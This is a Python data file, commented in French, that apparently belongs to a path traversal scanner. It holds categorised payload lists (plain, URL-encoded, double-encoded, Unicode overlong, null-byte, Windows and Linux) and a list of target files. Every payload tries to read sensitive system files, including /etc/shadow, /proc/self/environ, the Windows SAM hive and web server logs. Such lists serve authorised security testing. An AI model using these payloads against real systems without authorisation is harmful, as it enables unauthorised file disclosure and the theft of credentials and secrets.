BASIC_PAYLOADS = [
    # Linux paths - profondeur 1-6
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    
    # Autres fichiers Linux critiques
    "../../../etc/shadow",
    "../../../../etc/group",
    "../../../proc/self/environ",
    
    # Windows paths
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    
    # Chemins absolus
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini"
]

# Payloads avec encodage URL
ENCODED_PAYLOADS = [
    # Simple encodage
    "..%2Fetc%2Fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    
    # Encodage des points
    "%2e%2e/etc/passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    
    # Encodage mixte
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
]

# Double encodage
DOUBLE_ENCODED_PAYLOADS = [
    # Double encodage complet
    "%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # Variations
    "..%252f..%252fetc%252fpasswd",
    "%252e%252e/etc/passwd"
]

# Encodage Unicode
UNICODE_PAYLOADS = [
    # Unicode overlong encoding
    "..%c0%afetc%c0%afpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9cetc%c1%9cpasswd",
    
    # UTF-8 encoding
    "%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd"
]

# Payloads spécifiques Windows
WINDOWS_PAYLOADS = [
    # Backslash paths
    "..\\windows\\win.ini",
    "..\\..\\windows\\system.ini",
    "..\\..\\..\\boot.ini",
    
    # Mixed slashes
    "../..\\windows\\win.ini",
    "..\\../windows/win.ini",
    
    # Fichiers système Windows
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../windows/repair/sam"
]

# Payloads spécifiques Linux
LINUX_PAYLOADS = [
    # Fichiers systèmes
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../etc/hosts",
    
    # Logs
    "../../../../var/log/apache2/access.log",
    "../../../var/log/apache2/error.log",
    
    # Proc filesystem
    "../../../../proc/version",
    "../../../proc/self/environ",
    "../../../proc/self/cmdline"
]

# Null byte injection (pour contourner les extensions)
NULL_BYTE_PAYLOADS = [
    "../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    "../../../etc/shadow%00.txt"
]

# Tous les payloads organisés par catégorie
TRAVERSAL_PAYLOADS = {
    "basic": BASIC_PAYLOADS,
    "encoded": ENCODED_PAYLOADS,
    "double_encoded": DOUBLE_ENCODED_PAYLOADS,
    "unicode": UNICODE_PAYLOADS,
    "windows": WINDOWS_PAYLOADS,
    "linux": LINUX_PAYLOADS,
    "null_byte": NULL_BYTE_PAYLOADS
}

# Fichiers cibles à rechercher (pour génération dynamique)
TARGET_FILES = {
    "linux": [
        "etc/passwd",
        "etc/shadow",
        "etc/group",
        "etc/hosts",
        "proc/version",
        "proc/self/environ",
        "var/log/apache2/access.log"
    ],
    "windows": [
        "windows/win.ini",
        "windows/system.ini",
        "boot.ini",
        "windows/system32/drivers/etc/hosts",
        "windows/system32/config/sam"
    ]
}
